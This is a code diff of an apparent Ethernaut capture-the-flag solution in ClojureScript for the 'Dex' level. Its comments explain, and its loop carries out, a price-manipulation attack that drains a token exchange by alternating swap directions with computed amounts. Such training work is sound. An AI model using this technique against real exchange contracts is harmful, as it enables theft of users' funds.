@@ -1,4 +1,29 @@
 (ns ctf.ethernaut.dex
+  "The amount a trader gets back is:
+
+  `A/B * amount`
+
+  i.e. the Dix balance of the token they give
+  divided by token they get back.
+
+  If the traders wants to get back more than he gives.
+  The ratio `A/B` (mentioned above) should be > 1.
+
+
+  To ensure this we alternate the direction of the trade.
+  and we make the amount:
+
+  `min(what-player-is-giving-to-dex, what-dex-is-giving-to-player)`
+
+  With the starting balances of 100, 100, 10, 10. The following steps
+  will execute:
+
+  min(from.dex, from.player)
+  min(token-b.dex, token-b.player) -> (20, 90) -> 20
+  min(token-a.dex, token-a.player) -> (86, 24) -> 24
+  min(token-b.dex, token-b.player) -> (80, 30) -> 30
+  min(token-a.dex, token-a.player) -> (69, 41) -> 41
+  min(token-b.dex, token-b.player) -> (45, 65) -> 45"
   (:require [ctf.ethernaut.utils :as u]
             [ctf.ethernaut.wallets :as w]
             [cljs.core.async :as a]
@@ -25,7 +50,7 @@
 
 
 (defn deploy-swappable-token!
-  "Deploys the ERC20 Token contract using local wallet!
+  "Deploys the Swappable ERC20 Token contract using local wallet!
    Returns the `js/Promise`."
   [name sym initial-supply]
   (let [contract (u/contract
@@ -38,7 +63,7 @@
 
 
 (defn big-min
-  "returns minimum of two big numbers"
+  "returns minimum of two BigNumbers"
   [n1 n2]
   (if (.lte n1 n2) n1 n2))
 
@@ -52,14 +77,14 @@
           dex-to-balance    (<p! (.balanceOf to-contract (.-address dex)))
           player-balance    (<p! (.balanceOf from-contract (.-address player)))
           amount            (big-min dex-from-balance player-balance)]
-      ;; Print out current state before a new SWAP for debugging
       (prn "CURRENT STATE"
            dex-from-balance,
            dex-to-balance,
            amount)
+      ;; DEX balances for both tokens should be positive
+      ;; for executing the next swap.
       (when (and (.gt dex-from-balance (u/big-num 0))
                  (.gt dex-to-balance (u/big-num 0)))
-        ;; both DEX balances shuld be positive
         (do
           (<p!
            (.approve
@@ -72,6 +97,7 @@
             (.-address from-contract)
             (.-address to-contract)
             amount))
+          ;; Change the direction of the Swap (from->to, to->from)
           (recur
            to-contract
            from-contract))))))
@@ -123,15 +149,6 @@
 
 
 (comment
-
-  ;; should execute these steps
-
-  ;; min(from.dex, from.player)
-  ;; min(token-b.dex , token-b.player) -> (20, 90) -> 20
-  ;; min(token-a.dex , token-a.player) -> (86, 24) -> 24
-  ;; min(token-b.dex , token-b.player) -> (80, 30) -> 30
-  ;; min(token-a.dex , token-a.player) -> (69, 41) -> 41
-  ;; min(token-b.dex , token-b.player) -> (45, 65) -> 45
 
   ;; execute this code to start the price attack
   (a/take!
